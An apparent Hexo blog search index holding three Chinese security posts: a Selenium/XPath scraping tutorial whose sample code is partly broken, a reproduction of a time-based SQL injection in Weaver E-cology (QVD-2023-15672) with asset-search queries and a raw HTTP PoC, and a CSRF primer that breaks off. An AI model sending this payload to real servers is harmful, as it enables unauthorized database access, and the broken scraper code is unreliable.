<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python爬虫-Selenium框架使用(更新中)</title>
      <link href="/2023/07/13/Selenium%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/13/Selenium%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Selenium4-xpath"><a href="#Selenium4-xpath" class="headerlink" title="Selenium4+xpath"></a>Selenium4+xpath</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>  Selenium是当前广泛使用的开源自动化测试框架之一，它提供了丰富的工具和库，用于自动化测试Web应用程序。</p><p>  Selenium的主要功能是模拟用户与Web应用程序的交互，并能够自动化执行各种操作，如点击按钮、填写表单、验证页面元素等。通过这种方式，测试人员可以快速有效地执行大规模的测试，并验证应用程序在各种情况下的可靠性和稳定性。</p><p>  在实际渗透时,我们有时需要模拟人类对网站进行访问，或对网站进行某些自动化行为，我们可以借助Selenium框架实现。</p><h2 id="2-xpath"><a href="#2-xpath" class="headerlink" title="2.xpath"></a>2.xpath</h2><h3 id="2-1xpath简介"><a href="#2-1xpath简介" class="headerlink" title="2.1xpath简介"></a>2.1xpath简介</h3><p>XPath使用一种类似于目录结构的路径表达式，该表达式可以从根节点开始或当前节点开始，通过层级关系和条件筛选来定位所需的节点。XPath支持广泛的节点选择符号，如标签名、属性值、位置、逻辑运算符等，从而实现灵活的节点选择和过滤。</p><h3 id="2-2安装模块"><a href="#2-2安装模块" class="headerlink" title="2.2安装模块"></a>2.2安装模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install lxml</span><br></pre></td></tr></table></figure><h3 id="2-3xpath使用"><a href="#2-3xpath使用" class="headerlink" title="2.3xpath使用"></a>2.3xpath使用</h3><h4 id="2-3-1-etree"><a href="#2-3-1-etree" class="headerlink" title="2.3.1.etree"></a><strong>2.3.1.etree</strong></h4><p>etree 把 html源码变成对象</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">url = <span class="string">&quot;http://www.4399dmw.com/donghua/&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#网页的源码</span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#使用etree去转化html_doc,转化为了一个html的对象,此时element对象可以使用xpath语法</span></span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    <span class="built_in">print</span>(html.xpath(<span class="string">&quot;xpath语法&quot;</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="2-3-2xpath语法"><a href="#2-3-2xpath语法" class="headerlink" title="2.3.2xpath语法"></a><strong>2.3.2xpath语法</strong></h4><p>xpath语法中[1]就是第一个</p><p>基础用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//a查询当前HTML页面所有的a标签</span><br><span class="line">//a/@href当前html页面中所有a标签中的href的属性内容</span><br><span class="line">//a/text() 所有a标签中的文本内容</span><br></pre></td></tr></table></figure><p>属性处理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//img/@src拿到所有img标签中src的内容</span><br><span class="line">//a/img/@src 拿到所有a标签中的img标签里的src的内容</span><br><span class="line">//img[@alt=&#x27;某个值&#x27;]/@src 选择img标签中alt是某个值的标签并且提取src值</span><br></pre></td></tr></table></figure><p>class标签处理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//a[@class=&#x27;u-card&#x27;][1]/img 选到所有的a标签下的class的值为u-card中的第1个的img标签</span><br><span class="line">//div[@class=&#x27;lst-item&#x27;][3]/a[4]/img 选取页面中所有div且class等于lst-item选择其中第三个,在此之下选择第四个a标签下的img标签</span><br><span class="line">//div[@class=&#x27;lst-item&#x27;][1]/a[last()]/img 这里的a标签是选择最后一个</span><br></pre></td></tr></table></figure><p>p标签</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//p[text=&#x27;超变武兽第二季&#x27;]查找所有p标签中,文字内容是xxx的</span><br><span class="line">//p[contains(text(),&#x27;蜡笔&#x27;)] 查找所有p标签中,包含某些文字的</span><br><span class="line">//p[@*]页面中所有p标签凡是带有属性的都选出来</span><br></pre></td></tr></table></figure><p>div标签</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//div[@class=&#x27;lst-item&#x27;][2]/*</span><br><span class="line">将所有div标签class属性等于lst-item中的第二个中的所有内容</span><br><span class="line"></span><br><span class="line">//div[@class=&#x27;m-lst&#x27;]/div[position()=4]</span><br><span class="line">选择页面中所有class是m-ls的div中的第四个div</span><br></pre></td></tr></table></figure><h4 id="2-3-3实战"><a href="#2-3-3实战" class="headerlink" title="2.3.3实战"></a>2.3.3实战</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">url = <span class="string">&quot;http://www.4399dmw.com/search/dh-1-0-0-0-0-0-0/&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#网页的源码</span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#使用etree去转化html_doc,转化为了一个html的对象,此时element对象可以使用xpath语法</span></span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    donghuatitle = html.xpath(<span class="string">&quot;//div[@class=&#x27;u-ct&#x27;]/p[@class=&#x27;u-tt&#x27;]/text()&quot;</span>)</span><br><span class="line">    donghuapic = html.xpath(<span class="string">&quot;//div[@class=&#x27;lst&#x27;]/a/img/@data-src&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(donghuatitle)</span><br><span class="line">    <span class="built_in">print</span>(donghuapic)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>把每一页都爬下来,自动寻找下一页</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="comment">#页面内爬虫</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pachong</span>(<span class="params">url</span>):</span><br><span class="line">    url = url</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#网页的源码</span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#使用etree去转化html_doc,转化为了一个html的对象,此时element对象可以使用xpath语法</span></span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    donghuatitle = html.xpath(<span class="string">&quot;//div[@class=&#x27;u-ct&#x27;]/p[@class=&#x27;u-tt&#x27;]/text()&quot;</span>)</span><br><span class="line">    donghuapic = html.xpath(<span class="string">&quot;//div[@class=&#x27;lst&#x27;]/a/img/@data-src&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(donghuatitle)</span><br><span class="line">    <span class="built_in">print</span>(donghuapic)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#发现下一页</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_next_page</span>(<span class="params">url</span>):</span><br><span class="line">url = url</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#网页的源码</span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    next_page = html.xpath(<span class="string">&quot;//a[contains(text(),&#x27;下一页&#x27;)]/@href&quot;</span>)</span><br><span class="line">    really_next_page = <span class="string">&quot;http://www.4399.dmw.com&quot;</span>+nextpage[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">return</span> real_next_page</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&quot;http://www.4399dmw.com/search/dh-1-0-0-0-0-1-0/&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;开始爬行的url:&quot;</span>+url)</span><br><span class="line">            pachong(url)</span><br><span class="line">      url = find_next_page(url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;最后一页也爬行完了&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>在浏览器中中可下载xpath插件,方便写xpath语法匹配内容,</p><p>这里推荐</p><p><a href="https://chrome.google.com/webstore/detail/xpath-helper/hgimnogjllphhhkhlmebbmlgjoejdpjl?hl=zh-CN">https://chrome.google.com/webstore/detail/xpath-helper/hgimnogjllphhhkhlmebbmlgjoejdpjl?hl=zh-CN</a></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307121720420.png"></p><h2 id="3-selenium"><a href="#3-selenium" class="headerlink" title="3.selenium"></a>3.selenium</h2><h3 id="3-1简介"><a href="#3-1简介" class="headerlink" title="3.1简介"></a>3.1简介</h3><p>Selenium是一款强大的开源自动化测试工具，用于模拟和控制浏览器行为，实现对Web应用程序的自动化测试。它支持多种编程语言和浏览器，提供了丰富的功能和灵活的API，是开发人员和测试人员首选的自动化测试解决方案。</p><h3 id="3-2安装"><a href="#3-2安装" class="headerlink" title="3.2安装"></a>3.2安装</h3><p>1.selenium模块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure><p>手动下载chromedriver:</p><p><a href="https://vikyd.github.io/download-chromium-history-version/#/">https://vikyd.github.io/download-chromium-history-version/#/</a></p><p>注意:需要下载chrome对应版本的驱动使用</p><p>自动安装:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install webdriver-manager</span><br><span class="line">pip install packaging</span><br></pre></td></tr></table></figure><p>之后建立一文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from webdriver_manager.chrome import ChromeDriverManager</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(ChromeDriverManager().install())</span><br><span class="line">driver.get(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>进度条满后自动则安装成功</p><h3 id="3-3使用"><a href="#3-3使用" class="headerlink" title="3.3使用"></a>3.3使用</h3><p>1.打开网页</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&quot;https://www.baidu.com/&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>2.按键包</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#引入键盘按键包</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line">    driver.find_element(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;this s a test&quot;</span>)</span><br><span class="line">    <span class="comment">#组合键输入键盘上的ctrl+a</span></span><br><span class="line">    driver.find_element(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;kw&quot;</span>).send_keys(Keys.CONTROL,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment">#输入键盘上的ENTER</span></span><br><span class="line">    driver.find_element(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;kw&quot;</span>).send_keys(Keys.ENTER)</span><br></pre></td></tr></table></figure><p>3.配置浏览器启动使用Option类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入Option类</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="comment"># 实例化一个Option类的对象</span></span><br><span class="line">options = Options()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置浏览器显示大小</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;--window-size=1366,768&#x27;</span>)  </span><br><span class="line"><span class="comment">#Option还常用一下</span></span><br><span class="line"><span class="comment">#--user-agent=&quot;&quot; 设置请求头的User-Agent</span></span><br><span class="line"><span class="comment">#--window-size=1366,768 设置浏览器分辨率（窗口大小）</span></span><br><span class="line"><span class="comment">#--headless 无界面运行（无窗口）</span></span><br><span class="line"><span class="comment">#--start-maximized 最大化运行（全屏窗口）</span></span><br><span class="line"><span class="comment">#--incognito 隐身模式（无痕模式）</span></span><br><span class="line"><span class="comment">#--disable-javascript 禁用javascript</span></span><br><span class="line"><span class="comment">#--disable-infobars 禁用浏览器正在被自动化程序控制的提示</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动浏览器，并将启动参数带入到浏览器中</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br></pre></td></tr></table></figure><p>4.设置启动型号</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置手机型号1</span></span><br><span class="line">mobileEmulation = &#123;<span class="string">&#x27;deviceName&#x27;</span>: <span class="string">&#x27;iPhone 6/7/8&#x27;</span>&#125;</span><br><span class="line"><span class="comment">#设置手机型号2</span></span><br><span class="line">mobileEmulation = &#123;</span><br><span class="line">    <span class="string">&quot;deviceMetrics&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;width&quot;</span>:<span class="number">350</span>,</span><br><span class="line">        <span class="string">&quot;height&quot;</span>:<span class="number">200</span>,</span><br><span class="line">        <span class="string">&quot;pixelRatio&quot;</span>:<span class="number">3.0</span>,</span><br><span class="line">        <span class="string">&quot;touch&quot;</span>:<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 使用手机浏览</span></span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;mobileEmulation&#x27;</span>, mobileEmulation)</span><br></pre></td></tr></table></figure><p>5.模拟点击</p><p>手机下操作鼠标!!有时候页面存在覆盖层,需要点击两次</p><p>这里像素点的获取推荐使用google插件Page Ruler Smart</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="comment">#点击70.120像素</span></span><br><span class="line">action = ActionChains(driver).move_by_offset(<span class="number">70</span>,<span class="number">120</span>).click()</span><br><span class="line"><span class="comment">#开始执行</span></span><br><span class="line">action.perform()</span><br><span class="line"><span class="comment">#移回鼠标</span></span><br><span class="line">ActionChains(driver).move_by_offset(-<span class="number">70</span>,-<span class="number">120</span>).perform()</span><br></pre></td></tr></table></figure><p>6.模拟悬停</p><p>获取登录位置示例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line">driver.get(<span class="string">&quot;https://www.bilibili.com/&quot;</span>)</span><br><span class="line">denglu = driver.find_element(By.XPATH,<span class="string">&quot;//div[@class=&#x27;header-login-entry&#x27;]&quot;</span>)</span><br><span class="line">ActionChains(driver).move_to_element(denglu).click().perform()</span><br></pre></td></tr></table></figure><p>点击可以一次执行多个</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line">driver.get(<span class="string">&quot;https://www.bilibili.com/&quot;</span>)</span><br><span class="line"><span class="comment">#定位到频道</span></span><br><span class="line">pingdao = driver.find_element(By.XPATH,<span class="string">&quot;//div[@class=&#x27;icon-bg icon-bg__channel&#x27;]&quot;</span>)</span><br><span class="line"><span class="comment">#定位到登录</span></span><br><span class="line">denglu = driver.find_element(By.XPATH,<span class="string">&quot;//div[@class=&#x27;header-login-entry&#x27;]&quot;</span>)</span><br><span class="line">action = ActionChains(driver)</span><br><span class="line">action.click(pingdao)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">action.click(denglu)</span><br><span class="line">action.perform()</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>测试结果:先点击频道,后点击登录</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307130003342.png"></p><h3 id="3-4模拟人类操作"><a href="#3-4模拟人类操作" class="headerlink" title="3.4模拟人类操作"></a>3.4模拟人类操作</h3><p>1.手机处理拖拽操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动浏览器，并将启动参数带入到浏览器中</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line">driver.get(<span class="string">&quot;https://xrect1fy.github.io/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#拖拽操作</span></span><br><span class="line">first_tar = driver.find_element(By.XPATH,<span class="string">&quot;//a[@title=&#x27;Python基础(更新中)&#x27;and@class=&#x27;article-title&#x27;]&quot;</span>)</span><br><span class="line">second_tar = driver.find_element(By.XPATH,<span class="string">&quot;//h1&quot;</span>)</span><br><span class="line">action = ActionChains(driver)</span><br><span class="line">action.drag_and_drop(first_tar,second_tar).perform()</span><br></pre></td></tr></table></figure><p>拖拽操作需要使用xpath或者其他方法找到起始位置和终末位置</p><p>first_tar是初始位置,second_tar是终末位置</p><p>初始:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307130017161.png"></p><p>终末:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307130018316.png"></p><p>2.鼠标点击像素的操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ActionChains(driver).move_by_offset(<span class="number">200</span>,<span class="number">300</span>).click().perform()</span><br><span class="line">ActionChains(driver).move_by_offset(-<span class="number">200</span>,<span class="number">300</span>)</span><br></pre></td></tr></table></figure><p>3.点击写入只能一个一个字按</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ActionChains(driver).move_by_offset(<span class="number">500</span>,<span class="number">95</span>).click().key_down(<span class="string">&quot;a&quot;</span>).perform()</span><br><span class="line">ActionChains(driver).move_by_offset(-<span class="number">500</span>,-<span class="number">95</span>).perform()</span><br></pre></td></tr></table></figure><p>鼠标操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">click()点击鼠标左键</span><br><span class="line">click and hold() 点击鼠标左键不放</span><br><span class="line">context_click() 点击鼠标右键不放</span><br><span class="line">double_click() 双击鼠标左键</span><br><span class="line">drag_and_drop()鼠标拖拽</span><br><span class="line">drag_and_drop_by_offset()鼠标拖拽到哪个坐标然后松开</span><br><span class="line">key_down(&quot;a&quot;)按下一个键</span><br><span class="line">key_up(&quot;a&quot;)抬起一个键</span><br><span class="line">move_to_element(ele)移动鼠标到某个元素的位置</span><br><span class="line">move_to_element_with_offset(ele,100,0) 移动到某个元素的相对多少距离</span><br></pre></td></tr></table></figure><h2 id="4-参考文章"><a href="#4-参考文章" class="headerlink" title="4.参考文章"></a>4.参考文章</h2><p><a href="https://blog.csdn.net/wangqiang_cyou/article/details/128900832">https://blog.csdn.net/wangqiang_cyou/article/details/128900832</a></p><p><a href="https://blog.csdn.net/u013454322/article/details/128399381">https://blog.csdn.net/u013454322/article/details/128399381</a></p><p><a href="https://blog.csdn.net/beichanbb/article/details/122240155?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168917719716800227438372%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168917719716800227438372&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122240155-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=selenium%20find_element&spm=1018.2226.3001.4187">selenium中的find_element方法</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微E-cology sql延时注入漏洞(QVD-2023-15672)复现</title>
      <link href="/2023/07/12/%E6%B3%9B%E5%BE%AEE-cology%20sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(QVD-2023-15672)%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/07/12/%E6%B3%9B%E5%BE%AEE-cology%20sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(QVD-2023-15672)%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="泛微E-cology-sql延时注入漏洞-QVD-2023-15672-复现"><a href="#泛微E-cology-sql延时注入漏洞-QVD-2023-15672-复现" class="headerlink" title="泛微E-cology sql延时注入漏洞(QVD-2023-15672)复现"></a>泛微E-cology sql延时注入漏洞(QVD-2023-15672)复现</h1><p>参考文章:</p><p><a href="https://blog.csdn.net/qq_41904294/article/details/131666128?spm=1001.2014.3001.5502">泛微E-Cology SQL注入漏洞复现（QVD-2023-15672）</a></p><h2 id="1-产品简介"><a href="#1-产品简介" class="headerlink" title="1.产品简介"></a>1.产品简介</h2><p>泛微E-cology系统是中国泛微网络科技股份有限公司（以下简称“泛微科技”）开发的一种企业级协同办公平台。该系统以办公自动化和协同办公为核心，提供了一系列功能和工具，帮助企业实现信息管理、流程管控、团队协作和业务应用等多方面的需求。</p><p>泛微E-cology系统具有以下主要特点和功能：</p><ol><li>办公自动化：系统支持企业内部的各种办公流程自动化，包括审批流程、请假流程、报销流程等，提高工作效率和减少重复性工作。</li><li>协同办公：系统提供了团队协作、文档分享和讨论等功能，便于员工之间的信息共享和协调，增强团队合作和沟通效率。</li><li>企业信息管理：系统可以集中管理企业的人员信息、组织架构、项目信息等重要数据，方便企业对信息进行统一管理和查询。</li><li>业务应用扩展：系统支持自定义业务应用的开发和集成，可以根据企业的实际需求定制特定的应用模块，满足企业的个性化需求。</li><li>安全性和权限控制：系统具备严格的权限管理和安全机制，确保用户数据的安全性和访问控制。</li></ol><p>泛微E-cology系统适用于各类企业和组织，可以帮助企业优化流程、提高工作效率、加强团队协作，提升整体管理水平。同时，泛微科技也不断进行技术创新和产品优化，以满足不同企业的个性化需求。</p><h2 id="2-漏洞概述"><a href="#2-漏洞概述" class="headerlink" title="2.漏洞概述"></a>2.漏洞概述</h2><p>泛微E-cology的延时SQL注入漏洞可以被攻击者利用来获取未经授权的数据库访问权限，窃取敏感数据、修改数据或者执行其他恶意操作。攻击者可以通过构造特定的注入字符串，操纵应用程序的数据库查询，以达到攻击目的。</p><p>延时SQL注入漏洞的危害在于，它可能导致敏感数据泄露、系统崩溃、业务中断，甚至可能为攻击者提供全面的控制权限，从而危害企业的信息安全和业务运作。</p><h2 id="3-影响范围"><a href="#3-影响范围" class="headerlink" title="3.影响范围"></a>3.影响范围</h2><p>E-cology 9.x 补丁版本 &lt; 10.58.0</p><p>E-cology 8.x 补丁版本 &lt; 10.58.0</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4.复现过程"></a>4.复现过程</h2><p>1.资产检索</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">鹰图:web.icon=&quot;41eca7a9245394106a09b2534d8030df&quot;</span><br><span class="line">fofa:app=&quot;泛微-协同商务系统&quot;</span><br></pre></td></tr></table></figure><p>2.漏洞复现</p><p>访问搜索到的资产</p><p>尝试访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[ip]/weaver/weaver.file.FileDownloadForOutDoc?fileid=1+WAITFOR+DELAY%270%3A0%3A8%27&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure><p>发现sleep8秒后加载内容</p><p>加载8秒后成功加载:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307121245154.png"></p><p>验证成功。</p><p>Poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/weaver.file.FileDownloadForOutDoc?fileid=1+WAITFOR+DELAY%270%3A0%3A7%27&amp;isFromOutImg=1HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.修复方案"></a>5.修复方案</h2><p>临时解决方案:</p><p>限制访问来源地址，如非必要，不要将系统开放在互联网上。</p><p>升级修复方案:</p><p>官方已发布安全补丁,建议受影响用户尽快升级至10.58及以上版本</p><p><a href="https://www.weaver.com.cn/cs/securityDownload.asp#">https://www.weaver.com.cn/cs/securityDownload.asp#</a></p><h2 id="6-参考文章"><a href="#6-参考文章" class="headerlink" title="6.参考文章"></a>6.参考文章</h2><p><a href="https://blog.csdn.net/qq_41904294/article/details/131666128?spm=1001.2014.3001.5502">泛微E-Cology SQL注入漏洞复现（QVD-2023-15672）</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF基础</title>
      <link href="/2023/07/11/CSRF%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/11/CSRF%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="1-CSRF基础"><a href="#1-CSRF基础" class="headerlink" title="1.CSRF基础"></a>1.CSRF基础</h2><p>CSRF（Cross-Site Request Forgery），也称为跨站请求伪造，是一种常见的Web应用程序安全漏洞。它利用了Web应用程序对用户请求的信任，攻击者通过欺骗用户在受害者身份下执行恶意操作。</p><p>CSRF攻击的基本过程如下：</p><ol><li>用户登录：用户在一个网站A上进行登录，网站A会为其分配一个会话（session）。</li><li>恶意网站：用户后续浏览其他网站时，访问了一个恶意网站B。</li><li>伪造请求：恶意网站B会构造一个请求，该请求会针对用户在网站A上的身份进行操作，例如修改密码、转账等。</li><li>伪装请求：恶意网站B使用各种技术手段，如隐藏表单、图片标签或者通过Ajax请求等，将这个伪造的请求发送给网站A。</li><li>用户误操作：由于用户已经登录了网站A并信任该网站，浏览器会在不知情的情况下发送伪造请求，并执行恶意操作。</li></ol><p>CSRF攻击的危害取决于受到攻击的网站的业务逻辑和用户权限。该漏洞可能导致用户账户被盗、敏感信息泄露、非授权操作等。为了防范CSRF攻击，开发者可以采取一些措施，如使用CSRF令牌、验证Referer头、双重因素身份验证等。</p><p>漏洞危害</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">具体功能决定危害程度</span><br><span class="line">修改性别 / 个人信息等</span><br><span class="line">修改管理员密码</span><br><span class="line">添加管理员</span><br><span class="line">后台getshell</span><br></pre></td></tr></table></figure><h2 id="2-CSRF防御"><a href="#2-CSRF防御" class="headerlink" title="2.CSRF防御"></a>2.CSRF防御</h2><p>1.验证HTTP Referer字段<br>2.添加Token字段并验证<br>3.添加自定义字段并验证</p><h2 id="3-CSRF漏洞检测"><a href="#3-CSRF漏洞检测" class="headerlink" title="3.CSRF漏洞检测"></a>3.CSRF漏洞检测</h2><p>漏洞检测:<br>a.敏感功能缺乏csrf防护机制</p><ol><li>在burpsuite中观察post请求是否带有随机Token 和 验证码</li><li>再判断 去掉&#x2F;修改 Referer后是否仍然可以提交成功</li></ol><p>b.网站可以允许写入csrf 